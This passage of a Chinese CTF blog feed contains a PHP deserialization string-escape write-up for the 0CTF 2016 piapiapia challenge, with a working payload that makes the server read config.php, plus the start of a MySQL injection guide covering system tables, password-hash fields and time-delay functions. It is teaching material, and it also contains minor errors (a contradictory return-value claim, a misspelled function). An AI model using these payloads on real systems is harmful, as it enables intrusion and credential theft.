一共是20个字符！所以需要添加40个x</li></ul></li><li>所以最终的输入时<ul><li><code>a:2:&#123;i:0;s:45:&quot;adminxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li><li>filter之后，会变为</li><li><code>a:2:&#123;i:0;s:45:&quot;mikasayyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li></ul></li></ul><h4 id="4、总结"><a href="#4、总结" class="headerlink" title="4、总结"></a>4、总结</h4><ul><li>当字符增多：在输入的时候再加上精心构造的字符。经过过滤函数，字符变多之后，就把我们构造的给挤出来。从而实现字符逃逸</li><li>当字符减少：在输入的时候再加上精心构造的字符。经过过滤函数，字符减少后，会把原有的吞掉，使构造的字符实现代替</li></ul><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>[0CTF 2016]piapiapia</p><p>先常规操作:看源码，查看robots.txt，disearch扫描，抓包</p><p>sql没有反应，disearch发现<a href="http://www.zip源码泄露/">www.zip源码泄露</a></p><p>查看源码，发现flag在config.php文件里面，那么就需要文件包含</p><p>在profile.php内里有函数file_get_content()函数，我们要构建参数为config.php</p><p>读源码发现注册后上传的用户资料会被序列化然后对序列化后的代码进行过滤</p><p>但是过滤后发生替换直接存储，然后直接调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>发现where被替换后存在字符串逃逸漏洞（变长）</p><p>那么就可以把photo的文件名换成config,php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-string">&#x27;12345678901&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;123@321.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]=<span class="hljs-string">&#x27;name&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;wokao&#x27;</span>;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>);<br><br></code></pre></td></tr></table></figure><p>我们要替换成</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>长度33个那就要33个where</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]=<span class="hljs-string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-string">&#x27;12345678901&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;123@321.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]=<span class="hljs-string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;wokao&#x27;</span>;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>    <span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br>    <span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br>结果：<br>a:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;12345678901&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;123@321.com&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">198</span>:<span class="hljs-string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;<span class="hljs-string">&quot;;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:5:&quot;</span>wokao<span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string">a:4:&#123;s:5:&quot;</span>phone<span class="hljs-string">&quot;;s:11:&quot;</span><span class="hljs-number">12345678901</span><span class="hljs-string">&quot;;s:5:&quot;</span>email<span class="hljs-string">&quot;;s:11:&quot;</span><span class="hljs-number">123</span>@<span class="hljs-number">321</span>.com<span class="hljs-string">&quot;;s:8:&quot;</span>nickname<span class="hljs-string">&quot;;s:198:&quot;</span>hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<span class="hljs-string">&quot;;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;</span>config.php<span class="hljs-string">&quot;;&#125;&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;wokao&quot;</span>;&#125;<br><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123;<br>  [<span class="hljs-string">&quot;phone&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">11</span>) <span class="hljs-string">&quot;12345678901&quot;</span><br>  [<span class="hljs-string">&quot;email&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">11</span>) <span class="hljs-string">&quot;123@321.com&quot;</span><br>  [<span class="hljs-string">&quot;nickname&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">198</span>) <span class="hljs-string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span><br>  [<span class="hljs-string">&quot;photo&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">10</span>) <span class="hljs-string">&quot;config.php&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>但是nick那么的长度要小于10,采用数组绕过</p><p>在<code>;</code>后面加上<code>&#125;</code>闭合数组，where也要加一个</p><p>最终</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-string">&#x27;12345678901&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;123@321.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]=<span class="hljs-string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;wokao&#x27;</span>;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250205181546710.png" alt="image-20250205181546710"></p><p>上传后拿到图片( 记得抓包</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250205181638367.png" alt="image-20250205181638367"></p><p>解码拿到flag</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>字符串逃逸</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>笔记清单</title>
    <link href="/tuyi/2025/02/05/%E7%AC%94%E8%AE%B0%E6%B8%85%E5%8D%95/"/>
    <url>/tuyi/2025/02/05/%E7%AC%94%E8%AE%B0%E6%B8%85%E5%8D%95/</url>
    
    <content type="html"><![CDATA[<p>部分未及时更新</p><ul><li><input disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PyYAML/">反序列化(PyYAML)</a></li><li><input disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/26/xss%E6%8C%87%E5%8C%97/">xss指北</a></li><li><input disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/26/xxe%E6%8C%87%E5%8C%97/">xxe指北</a></li><li><input disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/26/Xpath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">Xpath注入指北</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/19/Djingo_ssti/">Djingo_ssti</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/26/pker/">pker</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/25/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pickle反序列化</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/24/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/">PHP原生类介绍</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHP伪协议介绍</a></li><li><input disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/26/Oracle%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">Oracle注入指北</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/28/Mysql%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">Mysql注入指北</a></li><li><input disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/26/MongDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">MongDB注入指北</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/27/%E8%AE%BADNS/">论DNS</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/02/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/">反序列化之字符串逃逸</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/02/15/zip%E6%96%87%E4%BB%B6%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/">zip文件逃逸漏洞</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/02/15/linux%E6%8F%90%E6%9D%83/">linux提权</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/02/15/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/">php伪随机数</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>导航</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mysql注入指北</title>
    <link href="/tuyi/2025/01/28/Mysql%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/"/>
    <url>/tuyi/2025/01/28/Mysql%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<p>祝大家新年快乐</p><p>sql注入和xss并称为落魄的漏洞之王，虽然被研究的透透的了，但是现在的ctf比赛还是存在很多这样的题目，各种各样的 payload，不但琐碎而且不成体系,实际上很多技巧都是根据语法来的。即如果知道基本语法，那么对注入的 payload 也就能了然于胸</p><h1 id="Mysql注入学习"><a href="#Mysql注入学习" class="headerlink" title="Mysql注入学习"></a>Mysql注入学习</h1><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20190407031440214.png" alt="20190407031440214"></p><p>首先，语法为从上到下。</p><p>简化之前的导图为 MySQL 所有的语法。其实在注入的过程中用不着这么详细，看看就好，有需要再查也不迟。简化的版本则为 MySQL 注入中常见的语法。</p><p>颜色表示：红色代表一定不能省略，橙色代表部分情况下能省略，灰色代表总是可以省略。红色与灰色好懂，橙色是个啥呢？拿 <code>GROUP BY</code> 为例，意思指的是，假如我们选了 <code>GROUP BY</code>，那么一定要对 <code>col_name</code>、<code>expr</code>、<code>position</code> 进行三选一。根据从上到下的顺序，接下来是 <code>ASC</code>、<code>DESC</code> 二选一，可选可不选。如果我们没使用 <code>GROUP BY</code>，那么就不需要进行三选一，因为流程没到这里。总结起来就是，如果下一步中存在橙色的语法，就一定要用到。</p><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><ol><li>group by：select + group by 的时候，是先 group by，再从 group by 里 select。所以 select 的列一定要在 group by 里存在。</li><li>语句执行成功返回值有2种情况，第一种本身返回数字的，就为数字，即：<code>select (select database());</code> 的返回值为 1；否则，执行成功为 0，反之为 1。即：<code>select (select database());</code> 的返回值为 0</li></ol><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>系统自带的数据库往往是很有用的，数据不仅全面，而且权限高的很。</p><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><p><code>information_schema</code> 提供了访问数据库元数据的方式。什么是<code>元数据</code>呢？就是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。</p><p>有用的表如下：</p><ul><li>schemata：提供了当前 mysql 实例中所有数据库的信息。’show databases;<code>的结果就是从这个表的</code>SCHEMA_NAME&#96; 字段来的。</li><li>tables：详细记载了所有的表的名字，以及哪个表属于哪个 schema、表的类型、表的引擎、创建时间等等信息。<code>show tables</code> 的结果就是从这个表的 <code>TABLE_NAME</code> 字段来的。</li></ul><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p><code>mysql</code> 数据库是 mysql 的核心数据库，，主要负责存储数据库的用户、权限设置、关键字等 mysql 自己需要使用的控制和管理信息。</p><p>有用的表如下：</p><ul><li>user：<code>user</code> 表中记录了用户信息，包括用户可登陆的 ip（host 字段）、用户名（User 字段）、密码 hash（authentication_string 字段）、是否有读取文件的权限（file_priv 字段）等等。注意，对于 mysql <code>5.7</code> 以上的版本，密码的 hash 字段不再是 <code>Password</code>，而是 <code>authentication_string</code>。</li></ul><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>MySQL 自带的变量的特征就是开头 <code>@@</code></p><ol><li><code>@@basedir</code>：MySQL 的安装路径</li><li><code>@@datadir</code>： MySQL 的数据库文件，即数据文件路径</li><li><code>@@version_compile_os</code>：操作系统</li><li><code>@@version</code>：数据库版本</li></ol><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>这些函数在注入的过程中能帮助我们不少忙。参数通常可以为 sql 语句（要加括号）</p><h3 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h3><ul><li><code>user()</code>：当前连接的数据库用户</li><li><code>version()</code>：数据库版本</li></ul><h3 id="字符串相关函数"><a href="#字符串相关函数" class="headerlink" title="字符串相关函数"></a>字符串相关函数</h3><ul><li><p>mid：</p><ul><li><p>截取字符串的一部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mid(string, start[, length])<br></code></pre></td></tr></table></figure><ul><li>string：字符串，</li><li>start：起始位置，起始位置为 1</li><li>length：截取长度</li></ul></li></ul></li><li><p>substr：</p><ul><li><p>截取字符串的一部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">substr(string, start, length)<br></code></pre></td></tr></table></figure><ul><li>string：字符串</li><li>start：起始位置，起始位置为 1</li><li>length：截取长度</li></ul></li></ul></li><li><p>substring：同 <code>substr</code></p></li></ul><p><strong>以上函数的参数均可以用 <code>from start for end</code> 代替</strong>，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select substring(&#x27;fuck&#x27; from 2 for 2);#从第二个字符开始截取长度是2<br>+--------------------------------+<br>| substring(&#x27;fuck&#x27; from 2 for 2) |<br>+--------------------------------+<br>| uc                             |<br>+--------------------------------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure><ul><li><p>hex：将数字&#x2F;字符串转为<code>十六进制</code>。特别是字符串，防止有特殊字符导致出现各种奇怪的问题。</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">hex(char)<br></code></pre></td></tr></table></figure></li><li><p>unhex：将十六进制转为字符串。注意，结果会直接转为对应的 acii 码，例如 <code>unhex(6D7973716C)</code> 的结果是 <code>mysql</code> 而不是 <code>470189044076</code></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">unhex(data)<br></code></pre></td></tr></table></figure></li><li><p>length：</p><ul><li><p>返回字符串长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">length(string)<br></code></pre></td></tr></table></figure><ul><li>string：字符串</li></ul></li></ul></li><li><p>left：</p><ul><li><p>获取字符串左边数起指定个数的字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">left(string, n)<br></code></pre></td></tr></table></figure><ul><li>string：要截取的字符串</li><li>n：长度</li></ul></li></ul></li><li><p>ord：</p><ul><li><p>获取字符的 ASCII 码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ord(char)<br></code></pre></td></tr></table></figure><ul><li>char：字符&#x2F;字符串（如果是字符串，则取它的第一个字符）</li></ul></li></ul></li><li><p>ascii：同 <code>ord</code></p></li><li><p>char：</p><ul><li><p>将 ASCII 码转为字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">char(a[, ...])<br></code></pre></td></tr></table></figure><ul><li>a：数字；后面可以加多个 ASCII 码，即构成字符串。</li></ul></li></ul></li><li><p>regexp：</p><ul><li><p>正则匹配，匹配到返回 1，反之为 0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">string1 regexp string2<br></code></pre></td></tr></table></figure><ul><li>string1：匹配的字符串</li><li>string2：正则表达式</li></ul></li></ul></li><li><p>concat：</p><ul><li><p>连接（多个）字符串（数字），返回字符串。如果有任何一个参数为 null，则返回值为 null</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">concat(string[, ...])<br></code></pre></td></tr></table></figure><ul><li>string：任意值</li></ul></li></ul></li><li><p>concat_ws</p><ul><li><p>和 concat 类似，将多个字符串连接成一个字符串，但是可以指定连接符。如果有任何一个参数为 null，对返回值无影响</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">concat_ws(sep, string[, ...])<br></code></pre></td></tr></table></figure><ul><li>sep：连接符</li><li>string：任意值</li></ul></li></ul></li><li><p>group_concat</p><ul><li><p>将 group by 产生的同一个分组中的值连接起来，成为一个字符串并返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">group_concat([distinct] colname [order by colname asc/desc ][separator sep])<br></code></pre></td></tr></table></figure><ul><li>distinct：去重</li><li>colname：列名</li><li>sep：分隔符</li></ul></li></ul></li></ul><h3 id="延时函数"><a href="#延时函数" class="headerlink" title="延时函数"></a>延时函数</h3><ul><li><p>sleep：</p><ul><li><p>延迟</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">sleep(sec)<br></code></pre></td></tr></table></figure><ul><li>sec：秒</li></ul></li></ul></li><li><p>banchmark：</p><ul><li><p>重复执行函数，较占用 cpu</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">banchmark(count, func)<br></code></pre></td></tr></table></figure><ul><li>count：执行的次数</li><li>func：函数</li></ul></li></ul></li><li><p><strong>笛卡尔积</strong></p><p> 笛卡尔积(因为连接表是一个很耗时的操作)</p><p> AxB&#x3D;A和B中每个元素的组合所组成的集合，就是连接表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT count(*) FROM information_schema.columns A, <br>information_schema.columns B, information_schema.tables C;<br>select * from table_name A, table_name B<br>select * from table_name A, table_name B，table_name C<br>select count(*) from table_name A, table_name B，table_name C <br></code></pre></td></tr></table></figure><p> 表可以是同一张表,受服务器性能影响很大</p></li></ul><p>另外，利用 <code>带外通道</code> 发起网络请求，也有可能造成时延。不过 MySQL 的带外通道只能在 Windows 下利用 <code>LOAD_FILE</code> 完成。</p><h3 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h3><ul><li><p><strong>ABS(x)</strong></p><ul><li>返回 <code>x</code> 的绝对值。</li><li>示例：<code>select abs(-5);</code> → 结果 <code>5</code></li></ul></li><li><p><strong>CEIL(x)</strong> 或 <strong>CEILING(x)</strong></p><ul><li>返回不小于 <code>x</code> 的最小整数（向上取整）。</li><li>示例：<code>select ceil(3.2);</code> → 结果 <code>4</code></li></ul></li><li><p><strong>FLOOR(x)</strong></p><ul><li>返回不大于 <code>x</code> 的最大整数（向下取整）。</li><li>示例：<code>select floor(3.8);</code> → 结果 <code>3</code></li></ul></li><li><p><strong>ROUND(x, d)</strong></p><ul><li>将 <code>x</code> 四舍五入到 <code>d</code> 位小数（默认为 <code>d=0</code>）。</li><li>示例：<code>select round(3.1415, 2);</code> → 结果 <code>3.14</code></li></ul></li><li><p><strong>RAND()</strong></p><ul><li><p>生成 0 到 1 之间的随机浮点数。</p></li><li><p>示例：<code>select rand();</code> → 结果类似 <code>0.5487</code></p></li><li><p>生成范围随机整数（如 1-100）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select floor(rand() * 100) + 1;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>POW(x, y)</strong> 或 <strong>POWER(x, y)</strong></p><ul><li>返回 <code>x</code> 的 <code>y</code> 次方。</li><li>示例：<code>select pow(2, 3);</code> → 结果 <code>8</code></li></ul></li><li><p><strong>SQRT(x)</strong></p><ul><li>返回 <code>x</code> 的平方根（若 <code>x</code> 为负数，返回 <code>NULL</code>）。</li><li>示例：<code>select sqrt(16);</code> → 结果 